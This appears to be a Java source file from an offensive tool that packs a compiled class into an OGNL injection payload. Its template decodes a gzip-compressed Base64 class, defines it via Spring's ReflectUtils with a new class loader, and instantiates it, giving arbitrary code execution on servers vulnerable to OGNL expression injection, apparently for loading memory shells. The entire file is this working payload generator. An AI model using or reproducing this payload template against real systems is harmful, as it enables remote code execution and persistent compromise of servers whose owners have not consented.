package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import lombok.SneakyThrows;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.OGNLSpringGzip, parent = Packers.OGNL, order = 920)
public class OGNLSpringGzipPacker implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
    }
}
